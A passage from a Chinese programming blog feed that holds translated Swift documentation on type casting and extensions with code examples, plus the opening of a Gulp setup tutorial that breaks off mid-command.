class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> movie <span class="keyword">in</span> someObjects <span class="keyword">as</span>! [<span class="type">Movie</span>] &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Movie: '\(movie.name)', dir. \(movie.director)"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Movie: '2001: A Space Odyssey', dir. Stanley Kubrick</span></span><br><span class="line"><span class="comment">// Movie: 'Moon', dir. Duncan Jones</span></span><br><span class="line"><span class="comment">// Movie: 'Alien', dir. Ridley Scott</span></span><br></pre></td></tr></table></figure><h1 id="Any-类型"><a href="#Any-类型" class="headerlink" title="Any 类型"></a>Any 类型</h1><p>这里有一个使用 <code>Any</code> 类型来对不同类型进行操作的例子，包含了函数类型以及非类类型。这个例子定义了一个名为 <code>things</code> 的数组用于储存 <code>Any</code> 类型的值：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> things = [<span class="type">Any</span>]()</span><br><span class="line"> </span><br><span class="line">things.append(<span class="number">0</span>)</span><br><span class="line">things.append(<span class="number">0.0</span>)</span><br><span class="line">things.append(<span class="number">42</span>)</span><br><span class="line">things.append(<span class="number">3.14159</span>)</span><br><span class="line">things.append(<span class="string">"hello"</span>)</span><br><span class="line">things.append((<span class="number">3.0</span>, <span class="number">5.0</span>))</span><br><span class="line">things.append(<span class="type">Movie</span>(name: <span class="string">"Ghostbusters"</span>, director: <span class="string">"Ivan Reitman"</span>))</span><br><span class="line">things.append(&#123; (name: <span class="type">String</span>) -&gt; <span class="type">String</span> <span class="keyword">in</span> <span class="string">"Hello, \(name)"</span> &#125;)</span><br></pre></td></tr></table></figure><p>这个 <code>things</code> 数组包含了两个 <code>Int</code> 值、两个 <code>Double</code> 值、一个 <code>String</code> 值、一个 <code>(Double, Double)</code> 的元组、<code>Movie</code> 实例『Ghostbusters』、以及一个接收 <code>String</code> 值并返回 <code>String</code> 值得闭包表达式。</p><p>你可以在 <code>switch</code> 结构的 case 中使用 <code>is</code> 和 <code>as</code> 操作符找出已知 Any 或 AnyObject 类型的常量或变量的具体类型。下面的例子使用 <code>switch</code> 语句遍历了 <code>things</code> 数组并查询每一项的类型。其中几个 <code>switch</code> 的 cases 将确定的值和确定类型的常量绑定在一起，使其值可以被输出：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> thing <span class="keyword">in</span> things &#123;</span><br><span class="line">    <span class="keyword">switch</span> thing &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span> <span class="keyword">as</span> <span class="type">Int</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"zero as an Int"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span> <span class="keyword">as</span> <span class="type">Double</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"zero as a Double"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">let</span> someInt <span class="keyword">as</span> <span class="type">Int</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"an integer value of \(someInt)"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">let</span> someDouble <span class="keyword">as</span> <span class="type">Double</span> <span class="keyword">where</span> someDouble &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"a positive double value of \(someDouble)"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">is</span> <span class="type">Double</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"some other double value that I don't want to print"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">let</span> someString <span class="keyword">as</span> <span class="type">String</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"a string value of \"\(someString)\""</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">let</span> (x, y) <span class="keyword">as</span> (<span class="type">Double</span>, <span class="type">Double</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"an (x, y) point at \(x), \(y)"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">let</span> movie <span class="keyword">as</span> <span class="type">Movie</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"a movie called '\(movie.name)', dir. \(movie.director)"</span>)</span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">let</span> stringConverter <span class="keyword">as</span> <span class="type">String</span> -&gt; <span class="type">String</span>:</span><br><span class="line">        <span class="built_in">print</span>(stringConverter(<span class="string">"Michael"</span>))</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"something else"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// zero as an Int</span></span><br><span class="line"><span class="comment">// zero as a Double</span></span><br><span class="line"><span class="comment">// an integer value of 42</span></span><br><span class="line"><span class="comment">// a positive double value of 3.14159</span></span><br><span class="line"><span class="comment">// a string value of "hello"</span></span><br><span class="line"><span class="comment">// an (x, y) point at 3.0, 5.0</span></span><br><span class="line"><span class="comment">// a movie called 'Ghostbusters', dir. Ivan Reitman</span></span><br><span class="line"><span class="comment">// Hello, Michael</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>「翻译」 Swift 扩展</title>
      <link href="/2016/07-02-%E6%89%A9%E5%B1%95/"/>
      <url>/2016/07-02-%E6%89%A9%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>这是对 swift 2.2 中 <a href="https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/Swift_Programming_Language/Extensions.html#//apple_ref/doc/uid/TP40014097-CH24-ID151" target="_blank" rel="noopener">扩展</a> 一节的翻译<br>这篇略微有点长，翻译了两天。。。<br>哎呀春节来了还是有点忙的<br>不能全身心投入到学习当中<br>就是要说的我好像每天都在学一样  </p><h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p><em>扩展</em>为现有的类、结构体、枚举类型、或协议添加了新功能。这也包括了为无访问权限的源代码（即<em>逆向建模</em>）扩展类型的能力。扩展和 Objective-C 中的分类类似。（和 Objective-C 的分类不同，Swift 的扩展没有名字。）</p><p>Swift 中的扩展可以：</p><ul><li>添加计算型实例属性和计算型类型属性</li><li>定义实例方法和类型方法</li><li>提供新初始化器</li><li>定义下标</li><li>定义、使用新嵌套类型</li><li>使现有的类型遵循某协议</li></ul><p>在 Swift 中，你甚至可以扩展一个协议，以提供其要求的实现，或添加符合类型的附加功能。详见<a href="此处应有连接">协议扩展</a>。</p><blockquote><p>注意<br>扩展可以向一个类型添加新的方法，但是不能重写已有的方法。</p></blockquote><h1 id="扩展的语法"><a href="#扩展的语法" class="headerlink" title="扩展的语法"></a>扩展的语法</h1><p>使用<code>extension</code>关键字来声明扩展：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">SomeType</span> </span>&#123;</span><br><span class="line">    <span class="comment">// new functionality to add to SomeType goes here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>扩展可以使已有的类型遵循一个或多个协议。在这种情况下，协议名、类或结构体的书写方式完全一样：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">SomeType</span>: <span class="title">SomeProtocol</span>, <span class="title">AnotherProtocol</span> </span>&#123;</span><br><span class="line">    <span class="comment">// implementation of protocol requirements goes here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用这种方式添加协议一致性详见<a href="此处应有链接">使用扩展添加协议一致性</a>。</p><blockquote><p>注意<br>如果你正向已存在的类型添加新功能时，新功能会在该类型的所有实例中可用，即使实例在该扩展定义之前。</p></blockquote><h1 id="计算型属性"><a href="#计算型属性" class="headerlink" title="计算型属性"></a>计算型属性</h1><p>扩展可以向已有的类型添加计算型实例属性和计算型类型属性。下面的例子向 Swift 内建的<code>Double</code>类型添加了五个计算型实例属性，以提供对距离单位的基本支持：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Double</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> km: <span class="type">Double</span> &#123; <span class="keyword">return</span> <span class="keyword">self</span> * <span class="number">1_000.0</span> &#125;</span><br><span class="line">    <span class="keyword">var</span> m: <span class="type">Double</span> &#123; <span class="keyword">return</span> <span class="keyword">self</span> &#125;</span><br><span class="line">    <span class="keyword">var</span> cm: <span class="type">Double</span> &#123; <span class="keyword">return</span> <span class="keyword">self</span> / <span class="number">100.0</span> &#125;</span><br><span class="line">    <span class="keyword">var</span> mm: <span class="type">Double</span> &#123; <span class="keyword">return</span> <span class="keyword">self</span> / <span class="number">1_000.0</span> &#125;</span><br><span class="line">    <span class="keyword">var</span> ft: <span class="type">Double</span> &#123; <span class="keyword">return</span> <span class="keyword">self</span> / <span class="number">3.28084</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> oneInch = <span class="number">25.4</span>.mm</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"One inch is \(oneInch) meters"</span>)</span><br><span class="line"><span class="comment">// Prints "One inch is 0.0254 meters"</span></span><br><span class="line"><span class="keyword">let</span> threeFeet = <span class="number">3</span>.ft</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Three feet is \(threeFeet) meters"</span>)</span><br><span class="line"><span class="comment">// Prints "Three feet is 0.914399970739201 meters</span></span><br></pre></td></tr></table></figure><p>这些计算型属性表述了<code>Double</code> 值应被看作是长度单位。即使他们被实现为计算型属性，这些属性的名字仍可使用点符号添加在浮点类型的文字值之后，作为一种使用该文本值来执行距离转换的方法。</p><p>在上面的例子中，一个<code>1.0</code>的<code>Double</code>值表示『一米』。这就是<code>m</code>计算型属性要返回<code>self</code>的原因——表达式<code>1.m</code>表示计算<code>1.0</code>的<code>Double</code>值。</p><p>其他的单位则在以米作为计量值的技术上加以转换表示。一千米表示1000米，所以<code>km</code>计算型属性将原值乘1000以表示米。类似的，一米有3.28084英尺，所以<code>ft</code>计算型属性用<code>Double</code>值除以3.28084，将英尺转换为米。</p><p>上述属性为只读计算属性，为了简洁没有使用<code>get</code>关键字。他们都返回<code>Double</code>类型的值，可用于所有使用<code>Double</code>值的数学计算中：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> aMarathon = <span class="number">42</span>.km + <span class="number">195</span>.m</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"A marathon is \(aMarathon) meters long"</span>)</span><br><span class="line"><span class="comment">// Prints "A marathon is 42195.0 meters long</span></span><br></pre></td></tr></table></figure><blockquote><p>注意<br>扩展可以添加新的计算型属性，但是不能添加存储型属性，也不能向已有的属性添加属性观测值。</p></blockquote><h1 id="初始化器"><a href="#初始化器" class="headerlink" title="初始化器"></a>初始化器</h1><p>扩展可向已有的类型添加新的初始化器。这允许你使用自定义类型作为初始化器参数扩展其他类型，或提供该类型的原始实现中未包含的额外初始化选项。</p><p>扩展能为类添加新的方便的初始化器，但是不能为类添加指定初始化器或反初始化器。指定初始化器和反初始化器 必须由原来类的实现提供。</p><blockquote><p>注意<br>如果你使用扩展为一个值类型添加初始化器，且该值类型为其所有储存的属性提供默认值，而又不定义任何自定义初始化器时，你可以在你扩展的初始化器中调用该类型默认的初始化器和成员初始化器。<br>如果你在值类型的原始实现中写过它的初始化器了，上述规则就不再适用了，详见<a href="此处应有连接">值类型的初始化器代理</a></p></blockquote><p>下面的例子定义了一个自定义的<code>Rect</code>结构体用于描述几何矩形。这个例子也定义了两个辅助结构体<code>Size</code>和<code>Point</code>，二者的默认值都是<code>0.0</code>：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Size</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> width = <span class="number">0.0</span>, height = <span class="number">0.0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="number">0.0</span>, y = <span class="number">0.0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Rect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> origin = <span class="type">Point</span>()</span><br><span class="line">    <span class="keyword">var</span> size = <span class="type">Size</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于<code>Rect</code>结构体为其所有属性提供了默认值，它将自动接受一个默认的初始化器和一个逐个成员初始化器，详见<a href="应有链接">标准初始化器</a>。这些初始化器将被用于创建新的<code>Rect</code>实例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> defaultRect = <span class="type">Rect</span>()</span><br><span class="line"><span class="keyword">let</span> memberwiseRect = <span class="type">Rect</span>(origin: <span class="type">Point</span>(x: <span class="number">2.0</span>, y: <span class="number">2.0</span>),</span><br><span class="line">    size: <span class="type">Size</span>(width: <span class="number">5.0</span>, height: <span class="number">5.0</span>))</span><br></pre></td></tr></table></figure><p>你可以扩展<code>Rect</code>结构体以额外提供一个附带原点和大小的初始化器：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Rect</span> </span>&#123;</span><br><span class="line">    <span class="keyword">init</span>(center: <span class="type">Point</span>, size: <span class="type">Size</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> originX = center.x - (size.width / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">let</span> originY = center.y - (size.height / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">self</span>.<span class="keyword">init</span>(origin: <span class="type">Point</span>(x: originX, y: originY), size: size)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个初始化器首先基于已知的<code>center</code>点和<code>size</code>值计算合适的原点。然后调用该结构体的自动逐个成员初始化器<code>init(origin:size:)</code>，这样就将新的原点和大小值保存在了对应属性中：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> centerRect = <span class="type">Rect</span>(center: <span class="type">Point</span>(x: <span class="number">4.0</span>, y: <span class="number">4.0</span>),</span><br><span class="line">    size: <span class="type">Size</span>(width: <span class="number">3.0</span>, height: <span class="number">3.0</span>))</span><br><span class="line"><span class="comment">// centerRect's origin is (2.5, 2.5) and its size is (3.0, 3.0)</span></span><br></pre></td></tr></table></figure><blockquote><p>注意<br>如果你使用扩展提供了一个新的初始化器，你仍应确保每一个实例都在初始化完成时完全初始化。</p></blockquote><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>扩展可以为已有的类型添加新的实例方法和类型方法。下面的例子为<code>Int</code>类型添加了一个名为<code>repetitions</code>的新实例方法：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Int</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">repetitions</span><span class="params">(task: <span class="params">()</span></span></span> -&gt; <span class="type">Void</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> <span class="number">0</span>..&lt;<span class="keyword">self</span> &#123;</span><br><span class="line">            task()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>repetitions(_:)</code>方法接受一个<code>() -&gt; Void</code>类型的单参数，表示一个没有参数且无返回值的函数。</p><p>在这个扩展定义之后，你可以在任何整形数字处调用<code>repetitions(_:)</code>方法，以执行相应次数的操作：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>.repetitions(&#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Hello!"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// Hello!</span></span><br><span class="line"><span class="comment">// Hello!</span></span><br><span class="line"><span class="comment">// Hello!</span></span><br></pre></td></tr></table></figure><p>使用结尾闭包语法使调用更加简洁：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>.repetitions&#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Goodbye!"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Goodbye!</span></span><br><span class="line"><span class="comment">// Goodbye!</span></span><br><span class="line"><span class="comment">// Goodbye!</span></span><br></pre></td></tr></table></figure><h1 id="异变实例方法"><a href="#异变实例方法" class="headerlink" title="异变实例方法"></a>异变实例方法</h1><p>增加了扩展的实例方法仍可以修改（或<em>异变</em>）实例本身。结构体和枚举类型方法在修改<code>self</code>或本身的属性时必须标注实例方法为<code>mutating</code>，和原本实现的异变方法一样。</p><p>下面的例子为Swift的<code>Int</code>类型添加了一个新的异变方法<code>square</code>，以表示原值的平方：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">mutating</span> <span class="function"><span class="keyword">func</span> <span class="title">square</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">self</span> = <span class="keyword">self</span> * <span class="keyword">self</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> someInt = <span class="number">3</span></span><br><span class="line">someInt.square()</span><br><span class="line"><span class="comment">// someInt is now 9</span></span><br></pre></td></tr></table></figure><h1 id="下标"><a href="#下标" class="headerlink" title="下标"></a>下标</h1><p>扩展能为已有的类型添加新的下标。下面的例子为Swift内建的<code>Int</code>类型添加了一个整形下标。这个下标<code>[n]</code>返回了从右开始第<code>n</code>位的十进制数字：</p><ul><li><code>123456789[0]</code>返回<code>9</code></li><li><code>123456789[1]</code>返回<code>8</code></li></ul><p>……以此类推：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">Int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">subscript</span>(digitIndex: <span class="type">Int</span>) -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> decimalBase = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> <span class="number">0</span>..&lt;digitIndex &#123;</span><br><span class="line">            decimalBase *= <span class="number">10</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">self</span> / decimalBase) % <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">746381295</span>[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// returns 5</span></span><br><span class="line"><span class="number">746381295</span>[<span class="number">1</span>]</span><br><span class="line"><span class="comment">// returns 9</span></span><br><span class="line"><span class="number">746381295</span>[<span class="number">2</span>]</span><br><span class="line"><span class="comment">// returns 2</span></span><br><span class="line"><span class="number">746381295</span>[<span class="number">8</span>]</span><br><span class="line"><span class="comment">// returns 7</span></span><br></pre></td></tr></table></figure><p>若<code>Int</code>值没有所需的那么多数字，下标实现返回<code>0</code>，就像是这个数左边用零填充：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">746381295</span>[<span class="number">9</span>]</span><br><span class="line"><span class="comment">// returns 0, as if you had requested:</span></span><br><span class="line"><span class="number">0746381295</span>[<span class="number">9</span>]</span><br></pre></td></tr></table></figure><h1 id="嵌套类型"><a href="#嵌套类型" class="headerlink" title="嵌套类型"></a>嵌套类型</h1><p>扩展可以为已有的类，结构体，和枚举类型添加新的嵌套类型：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">extension Int &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">Kind</span> &#123;</span></span><br><span class="line">        <span class="keyword">case</span> Negative, Zero, Positive</span><br><span class="line">    &#125;</span><br><span class="line">    var <span class="symbol">kind:</span> Kind &#123;</span><br><span class="line">        switch <span class="keyword">self</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> .Zero</span><br><span class="line">        <span class="keyword">case</span> let x where x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> .Positive</span><br><span class="line">        <span class="symbol">default:</span></span><br><span class="line">            <span class="keyword">return</span> .Negative</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子为<code>Int</code>添加了新的嵌套枚举类型。这个名为<code>Kind</code>的枚举类型表示一个特定整数的类型。具体表示了这个数字是负数、零还是正数。</p><p>这个例还向<code>Int</code>中添加了新的可计算实例<code>kind</code>，以返回该整数的合适<code>Kind</code>枚举示例。</p><p>这个嵌套的枚举类型可以和任意<code>Int</code>一起使用：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printIntegerKinds</span><span class="params">(numbers: [Int])</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> numbers &#123;</span><br><span class="line">        <span class="keyword">switch</span> number.kind &#123;</span><br><span class="line">        <span class="keyword">case</span> .<span class="type">Negative</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"- "</span>, terminator: <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">case</span> .<span class="type">Zero</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"0 "</span>, terminator: <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">case</span> .<span class="type">Positive</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"+ "</span>, terminator: <span class="string">""</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">""</span>)</span><br><span class="line">&#125;</span><br><span class="line">printIntegerKinds([<span class="number">3</span>, <span class="number">19</span>, -<span class="number">27</span>, <span class="number">0</span>, -<span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>])</span><br><span class="line"><span class="comment">// Prints "+ + - 0 - 0 +</span></span><br></pre></td></tr></table></figure><p>这里<code>printIntegerKinds</code>函数接收一个<code>Int</code>的数组并对这些值进行迭代。在数组的每一次迭代中，该函数考虑这个整数的计算属性，并输出合适的描述。</p><blockquote><p>注意<br>已知<code>number.kind</code>是<code>Int.Kind</code>类型。因此，<code>switch</code>结构中的所有<code>Int.Kind</code>成员值都可以简写，例如用<code>.Negative</code>表示<code>Int.Kind.Negative</code>。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>快速上手使用 Gulp</title>
      <link href="/2016/06-25-gulp/"/>
      <url>/2016/06-25-gulp/</url>
      
        <content type="html"><![CDATA[<p>这篇文章的目的是让你使用Gulp。<br><strong>前提</strong>：你要至少了解NPM，Gulp是什么，对前端开发的流程有个大概的概念。<br>如果你想知道Gulp是什么，那么请你先看<a href="http://gulpjs.com/" target="_blank" rel="noopener">Gulp的官方文档（英文）</a>。<br>我第一次看<a href="http://www.gulpjs.com.cn/" target="_blank" rel="noopener">中文官方文档</a>时并没有怎么看懂。<br>要感谢<a href="https://github.com/cssmagic/blog/issues/62" target="_blank" rel="noopener">css魔法的博客中对Gulp4入门指南的翻译</a>。  </p><hr><p>我默认你已经安装了npm。<br>并全局安装了gulp：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="selector-tag">i</span> -g gulp</span><br></pre></td></tr></table></figure></p><h2 id="在gulp配置文件之前"><a href="#在gulp配置文件之前" class="headerlink" title="在gulp配置文件之前"></a>在gulp配置文件之前</h2><p>项目文件夹结构如下<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-app</span><br><span class="line">index.html</span><br><span class="line">-css</span><br><span class="line">main.scss</span><br><span class="line">-img</span><br><span class="line">-js</span><br><span class="line">dropdown.js</span><br><span class="line">scroll.js</span><br><span class="line">-DIST</span><br><span class="line">gulpfile.js</span><br><span class="line">-node_modules</span><br><span class="line">package.json</span><br></pre></td></tr></table></figure></p><p>下面是需要在项目文件夹根目录执行的命令<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br><span class="line">cnpm i -D gulp-sass gulp-uglify gulp-concat gulp-concat-css gulp-clean-css gulp-<span class="keyword">merge</span>-<span class="keyword">link</span> gulp-zip gulp-imagemin gulp-<span class="keyword">sequence</span> gulp-<span class="keyword">connect</span> gulp-<span class="keyword">open</span> gulp gulp-uncss</span><br><span class="line">touch gulpfile.js &amp;&amp; <span class="keyword">open</span> 